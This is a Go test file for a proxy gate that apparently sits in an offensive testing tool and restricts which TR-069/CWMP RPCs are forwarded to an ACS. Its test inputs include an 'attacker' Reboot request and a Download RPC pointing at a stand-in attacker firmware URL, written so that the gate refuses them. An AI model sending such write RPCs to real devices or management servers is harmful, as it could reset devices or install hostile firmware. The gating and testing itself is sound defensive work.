//go:build offensive

package cwmp_test

import (
	"bufio"
	"bytes"
	"context"
	"fmt"
	"io"
	"net"
	"net/http"
	"strings"
	"sync"
	"testing"
	"time"

	"local/elsereno/offensive/confirm"
	cwmpwrite "local/elsereno/offensive/write/cwmp"
)

// ---- fakes ----------------------------------------------------

type fakeDeriver struct{ key []byte }

func (f *fakeDeriver) Derive(_ string, out []byte) error {
	copy(out, f.key)
	return nil
}

type fakeAuditor struct {
	mu     sync.Mutex
	events []confirm.AuditEvent
}

func (f *fakeAuditor) Record(_ context.Context, ev confirm.AuditEvent) error {
	f.mu.Lock()
	defer f.mu.Unlock()
	f.events = append(f.events, ev)
	return nil
}

const testDeriverKey = "test-key-32-byte-long--------"

// ---- AllowlistHash --------------------------------------------

// hashEqual binds both return values to variables so we can
// take slices (Go arrays returned from functions aren't
// addressable).
func hashEqual(a, b [32]byte) bool { return bytes.Equal(a[:], b[:]) }

func TestAllowlistHash_OrderInsensitive(t *testing.T) {
	a := []cwmpwrite.AllowedRPC{
		{Name: "SetParameterValues"},
		{Name: "Reboot"},
	}
	b := []cwmpwrite.AllowedRPC{
		{Name: "Reboot"},
		{Name: "SetParameterValues"},
	}
	if !hashEqual(cwmpwrite.AllowlistHash("t", a), cwmpwrite.AllowlistHash("t", b)) {
		t.Fatalf("hash depends on input order")
	}
}

func TestAllowlistHash_PrefixStripped(t *testing.T) {
	// Operator copy-pastes "cwmp:SetParameterValues" from a wire
	// capture; canonicaliser strips the prefix.
	a := []cwmpwrite.AllowedRPC{{Name: "SetParameterValues"}}
	b := []cwmpwrite.AllowedRPC{{Name: "cwmp:SetParameterValues"}}
	if !hashEqual(cwmpwrite.AllowlistHash("t", a), cwmpwrite.AllowlistHash("t", b)) {
		t.Fatal("prefix stripping not idempotent")
	}
}

func TestAllowlistHash_CaseSensitive(t *testing.T) {
	// CWMP RPC names are case-sensitive per TR-069 §A.4.
	// SetParameterValues ≠ setparametervalues.
	a := []cwmpwrite.AllowedRPC{{Name: "SetParameterValues"}}
	b := []cwmpwrite.AllowedRPC{{Name: "setparametervalues"}}
	if hashEqual(cwmpwrite.AllowlistHash("t", a), cwmpwrite.AllowlistHash("t", b)) {
		t.Fatal("hash should distinguish case-different RPCs (RPC names ARE case-sensitive)")
	}
}

func TestAllowlistHash_DifferentTarget(t *testing.T) {
	a := []cwmpwrite.AllowedRPC{{Name: "Reboot"}}
	if hashEqual(cwmpwrite.AllowlistHash("acs-a:7547", a), cwmpwrite.AllowlistHash("acs-b:7547", a)) {
		t.Fatal("hash should vary with target")
	}
}

func TestAllowlistHash_WhitespaceTrimmed(t *testing.T) {
	a := []cwmpwrite.AllowedRPC{{Name: "  Reboot  "}}
	b := []cwmpwrite.AllowedRPC{{Name: "Reboot"}}
	if !hashEqual(cwmpwrite.AllowlistHash("t", a), cwmpwrite.AllowlistHash("t", b)) {
		t.Fatal("canonicaliser should trim whitespace")
	}
}

// ---- SessionMutation ------------------------------------------

func TestSessionMutation_Shape(t *testing.T) {
	allowed := []cwmpwrite.AllowedRPC{{Name: "SetParameterValues"}}
	mut := cwmpwrite.SessionMutation("acs.example.com:7547", allowed)
	if mut.Protocol != "cwmp" {
		t.Errorf("Protocol=%q, want cwmp", mut.Protocol)
	}
	if mut.Operation != "proxy_session" {
		t.Errorf("Operation=%q, want proxy_session", mut.Operation)
	}
	want := cwmpwrite.AllowlistHash("acs.example.com:7547", allowed)
	if !hashEqual(mut.PayloadHash, want) {
		t.Error("PayloadHash does not match AllowlistHash output")
	}
}

// ---- Authorise contract ---------------------------------------

func mintToken(t *testing.T, target string, allowed []cwmpwrite.AllowedRPC) string {
	t.Helper()
	tok, err := confirm.ExpectedToken(cwmpwrite.SessionMutation(target, allowed), &fakeDeriver{key: []byte(testDeriverKey)})
	if err != nil {
		t.Fatal(err)
	}
	return tok
}

func TestAuthorise_DeniedWithoutToken(t *testing.T) {
	h := &cwmpwrite.WriteGatedHandler{
		Target:  "acs:7547",
		Deriver: &fakeDeriver{key: []byte(testDeriverKey)},
		Auditor: &fakeAuditor{},
		SessionConfirm: confirm.Confirm{
			AcceptsWrites: true,
			ConfirmTarget: "acs:7547",
			ConfirmToken:  "wrong-token",
		},
	}
	if err := h.Authorise(context.Background()); err == nil {
		t.Fatal("expected bad-token error")
	}
}

func TestHandle_UnauthorisedErrors(t *testing.T) {
	h := &cwmpwrite.WriteGatedHandler{
		Target:  "acs:7547",
		Deriver: &fakeDeriver{key: []byte(testDeriverKey)},
		Auditor: &fakeAuditor{},
	}
	err := h.Handle(context.Background(), &ioPair{}, &ioPair{})
	if err == nil {
		t.Fatal("expected ErrSessionNotAuthorised")
	}
}

type ioPair struct{}

func (*ioPair) Read(_ []byte) (int, error)  { return 0, io.EOF }
func (*ioPair) Write(b []byte) (int, error) { return len(b), nil }

// ---- End-to-end gate ------------------------------------------

// upstreamACS is a minimal fake ACS that reads the incoming POST,
// records the body, and replies with a canned SOAP 200 OK so the
// test-side can assert on what was forwarded.
type upstreamACS struct {
	mu           sync.Mutex
	requestBody  []byte
	requestCount int
}

func (u *upstreamACS) run(conn net.Conn) {
	br := bufio.NewReader(conn)
	for {
		req, err := http.ReadRequest(br)
		if err != nil {
			return
		}
		body, _ := io.ReadAll(req.Body)
		_ = req.Body.Close()
		u.mu.Lock()
		u.requestBody = append(u.requestBody, body...)
		u.requestCount++
		u.mu.Unlock()
		// Canned 200 OK with empty SOAP envelope.
		resp := `<?xml version="1.0"?><soap-env:Envelope xmlns:soap-env="http://schemas.xmlsoap.org/soap/envelope/"><soap-env:Body></soap-env:Body></soap-env:Envelope>`
		_, _ = fmt.Fprintf(conn,
			"HTTP/1.1 200 OK\r\nContent-Type: text/xml\r\nContent-Length: %d\r\nConnection: keep-alive\r\n\r\n%s",
			len(resp), resp)
	}
}

func (u *upstreamACS) seen() (string, int) {
	u.mu.Lock()
	defer u.mu.Unlock()
	return string(u.requestBody), u.requestCount
}

func driveSession(t *testing.T, allowed []cwmpwrite.AllowedRPC) (net.Conn, *upstreamACS) {
	t.Helper()
	target := "acs.test:7547"
	h := &cwmpwrite.WriteGatedHandler{
		Target:  target,
		Allowed: allowed,
		Deriver: &fakeDeriver{key: []byte(testDeriverKey)},
		Auditor: &fakeAuditor{},
		SessionConfirm: confirm.Confirm{
			AcceptsWrites: true,
			ConfirmTarget: target,
			ConfirmToken:  mintToken(t, target, allowed),
		},
	}
	if err := h.Authorise(context.Background()); err != nil {
		t.Fatal(err)
	}
	clientPipe, handlerClientSide := net.Pipe()
	handlerUpstreamSide, originSide := net.Pipe()

	ctx, cancel := context.WithCancel(context.Background())
	t.Cleanup(func() {
		cancel()
		_ = clientPipe.Close()
		_ = handlerClientSide.Close()
		_ = handlerUpstreamSide.Close()
		_ = originSide.Close()
	})

	acs := &upstreamACS{}
	go acs.run(originSide)
	go func() { _ = h.Handle(ctx, handlerClientSide, handlerUpstreamSide) }()
	return clientPipe, acs
}

func readHTTPResponseSummary(t *testing.T, conn net.Conn) (int, http.Header, string) {
	t.Helper()
	_ = conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	br := bufio.NewReader(conn)
	resp, err := http.ReadResponse(br, nil)
	if err != nil {
		t.Fatalf("read response: %v", err)
	}
	defer func() { _ = resp.Body.Close() }()
	body, _ := io.ReadAll(resp.Body)
	return resp.StatusCode, resp.Header.Clone(), string(body)
}

func soapEnvelope(rpcOpen string) string {
	return fmt.Sprintf(`<?xml version="1.0"?>
<soap-env:Envelope xmlns:soap-env="http://schemas.xmlsoap.org/soap/envelope/"
                   xmlns:cwmp="urn:dslforum-org:cwmp-1-2">
  <soap-env:Header>
    <cwmp:ID soap-env:mustUnderstand="1">acs-1</cwmp:ID>
  </soap-env:Header>
  <soap-env:Body>
    %s
  </soap-env:Body>
</soap-env:Envelope>`, rpcOpen)
}

func postRequest(body string) string {
	return fmt.Sprintf("POST / HTTP/1.1\r\n"+
		"Host: acs.test:7547\r\n"+
		"Content-Type: text/xml\r\n"+
		"SOAPAction: \"\"\r\n"+
		"Content-Length: %d\r\n\r\n%s",
		len(body), body)
}

// TestGateReadOnlyRPCAlwaysPasses — GetParameterValues is in
// alwaysSafeRPCs; passes without needing allowlist.
func TestGateReadOnlyRPCAlwaysPasses(t *testing.T) {
	client, acs := driveSession(t, nil)
	body := soapEnvelope(`<cwmp:GetParameterValues><ParameterNames><string>InternetGatewayDevice.DeviceInfo.ModelName</string></ParameterNames></cwmp:GetParameterValues>`)
	_, _ = io.WriteString(client, postRequest(body))
	code, _, _ := readHTTPResponseSummary(t, client)
	if code != http.StatusOK {
		t.Errorf("read RPC: got %d, want 200", code)
	}
	// Upstream should have received the request verbatim.
	deadline := time.Now().Add(500 * time.Millisecond)
	for time.Now().Before(deadline) {
		if _, n := acs.seen(); n >= 1 {
			break
		}
		time.Sleep(10 * time.Millisecond)
	}
	forwarded, n := acs.seen()
	if n != 1 {
		t.Fatalf("ACS saw %d requests, want 1", n)
	}
	if !strings.Contains(forwarded, "GetParameterValues") {
		t.Errorf("forwarded body doesn't contain the RPC: %s", forwarded)
	}
}

// TestGateAllowedWriteRPCPasses — SetParameterValues is write-
// capable but IS in the allowlist → passes.
func TestGateAllowedWriteRPCPasses(t *testing.T) {
	client, acs := driveSession(t, []cwmpwrite.AllowedRPC{{Name: "SetParameterValues"}})
	body := soapEnvelope(`<cwmp:SetParameterValues><ParameterList>...</ParameterList></cwmp:SetParameterValues>`)
	_, _ = io.WriteString(client, postRequest(body))
	code, _, _ := readHTTPResponseSummary(t, client)
	if code != http.StatusOK {
		t.Errorf("allowed write RPC: got %d, want 200", code)
	}
	deadline := time.Now().Add(500 * time.Millisecond)
	for time.Now().Before(deadline) {
		if _, n := acs.seen(); n >= 1 {
			break
		}
		time.Sleep(10 * time.Millisecond)
	}
	if _, n := acs.seen(); n != 1 {
		t.Fatalf("ACS saw %d requests, want 1", n)
	}
}

// TestGateBlockedRPCReturnsSOAPFault — write-capable RPC NOT in
// allowlist → SOAP Fault with CWMP fault code 9001.
func TestGateBlockedRPCReturnsSOAPFault(t *testing.T) {
	client, acs := driveSession(t,
		[]cwmpwrite.AllowedRPC{{Name: "SetParameterValues"}})
	// Attacker tries Reboot (not in allowlist).
	body := soapEnvelope(`<cwmp:Reboot><CommandKey>attacker-reboot</CommandKey></cwmp:Reboot>`)
	_, _ = io.WriteString(client, postRequest(body))
	code, header, respBody := readHTTPResponseSummary(t, client)
	// TR-069 returns 200 OK + SOAP Fault for application-level
	// errors. The gate follows that convention.
	if code != http.StatusOK {
		t.Errorf("blocked RPC: got status %d, want 200", code)
	}
	if !strings.Contains(respBody, "<soap-env:Fault>") {
		t.Errorf("response doesn't contain SOAP Fault:\n%s", respBody)
	}
	if !strings.Contains(respBody, "9001") {
		t.Errorf("Fault body doesn't contain 9001 request-denied:\n%s", respBody)
	}
	if !strings.Contains(respBody, `"Reboot"`) {
		t.Errorf("Fault body doesn't name the rejected RPC:\n%s", respBody)
	}
	reason := header.Get("X-Elsereno-Gate-Reason")
	if !strings.Contains(reason, "Reboot") {
		t.Errorf("X-Elsereno-Gate-Reason doesn't mention the RPC: %q", reason)
	}
	time.Sleep(50 * time.Millisecond)
	if _, n := acs.seen(); n != 0 {
		t.Fatalf("ACS saw %d requests for a blocked RPC, want 0", n)
	}
}

// TestGateEmptyAllowlistBlocksAllWrites — empty allowlist means
// every write-capable RPC is refused (read-only RPCs still pass
// via alwaysSafeRPCs).
func TestGateEmptyAllowlistBlocksAllWrites(t *testing.T) {
	client, acs := driveSession(t, nil)
	body := soapEnvelope(`<cwmp:FactoryReset/>`)
	_, _ = io.WriteString(client, postRequest(body))
	code, _, respBody := readHTTPResponseSummary(t, client)
	if code != http.StatusOK {
		t.Errorf("got %d, want 200 (TR-069 app-level Fault)", code)
	}
	if !strings.Contains(respBody, "9001") {
		t.Errorf("empty allowlist: FactoryReset should have produced SOAP Fault 9001")
	}
	time.Sleep(50 * time.Millisecond)
	if _, n := acs.seen(); n != 0 {
		t.Fatalf("ACS saw %d requests, want 0 (empty allowlist blocks writes)", n)
	}
}

// TestGateGETBypassesSOAPParser — non-POST requests don't get
// SOAP-parsed (TR-069 uses POST for RPCs; ACS status endpoints
// commonly sit on GET /).
func TestGateGETBypassesSOAPParser(t *testing.T) {
	client, acs := driveSession(t, nil)
	_, _ = io.WriteString(client, "GET /acs/status HTTP/1.1\r\nHost: acs.test:7547\r\n\r\n")
	code, _, _ := readHTTPResponseSummary(t, client)
	if code != http.StatusOK {
		t.Errorf("GET: got %d, want 200 passthrough", code)
	}
	deadline := time.Now().Add(500 * time.Millisecond)
	for time.Now().Before(deadline) {
		if _, n := acs.seen(); n >= 1 {
			break
		}
		time.Sleep(10 * time.Millisecond)
	}
	if _, n := acs.seen(); n != 1 {
		t.Fatalf("ACS saw %d GETs, want 1 (passthrough)", n)
	}
}

// TestGateHandlesSoapenvPrefix — some stacks use `soapenv:`
// instead of `soap-env:`; the gate should still find the RPC.
func TestGateHandlesSoapenvPrefix(t *testing.T) {
	client, _ := driveSession(t, nil)
	body := `<?xml version="1.0"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:cwmp="urn:dslforum-org:cwmp-1-2">
  <soapenv:Body>
    <cwmp:Reboot><CommandKey>test</CommandKey></cwmp:Reboot>
  </soapenv:Body>
</soapenv:Envelope>`
	_, _ = io.WriteString(client, postRequest(body))
	_, _, respBody := readHTTPResponseSummary(t, client)
	// Empty allowlist → Reboot is blocked. If the RPC name
	// extraction missed the `soapenv:` variant, the gate would
	// fail open and forward the request — this test catches that.
	if !strings.Contains(respBody, "9001") {
		t.Errorf("soapenv: variant: gate should still extract RPC name and block:\n%s", respBody)
	}
}

// TestGateEmptyBodyPassesThrough — some ACS deployments send
// empty POSTs as keep-alives; they should pass without triggering
// the gate (there's no RPC to check).
func TestGateEmptyBodyPassesThrough(t *testing.T) {
	client, acs := driveSession(t, nil)
	_, _ = io.WriteString(client, "POST / HTTP/1.1\r\nHost: acs.test:7547\r\nContent-Length: 0\r\n\r\n")
	code, _, _ := readHTTPResponseSummary(t, client)
	if code != http.StatusOK {
		t.Errorf("empty POST: got %d, want 200", code)
	}
	deadline := time.Now().Add(500 * time.Millisecond)
	for time.Now().Before(deadline) {
		if _, n := acs.seen(); n >= 1 {
			break
		}
		time.Sleep(10 * time.Millisecond)
	}
	if _, n := acs.seen(); n != 1 {
		t.Fatalf("ACS saw %d keep-alive POSTs, want 1", n)
	}
}

// TestRPCNameExtraction_Unit — direct unit test of
// extractRPCName via an end-to-end test cycle that exercises
// both an un-prefixed and prefixed envelope. Because
// extractRPCName is unexported, we can only exercise it through
// the gate here; the negative-result case (malformed XML) is
// covered indirectly by TestGateEmptyBodyPassesThrough.
func TestRPCNameExtraction_Unit(t *testing.T) {
	client, _ := driveSession(t, nil)
	// Download is write-capable + not in allowlist → should
	// refuse with SOAP Fault, proving extraction worked.
	body := soapEnvelope(`<cwmp:Download><CommandKey>fw1</CommandKey><URL>http://attacker/rom.bin</URL></cwmp:Download>`)
	_, _ = io.WriteString(client, postRequest(body))
	_, _, respBody := readHTTPResponseSummary(t, client)
	if !strings.Contains(respBody, "9001") {
		t.Errorf("Download should have been refused:\n%s", respBody)
	}
	if !strings.Contains(respBody, `"Download"`) {
		t.Errorf("refusal doesn't name the Download RPC:\n%s", respBody)
	}
}
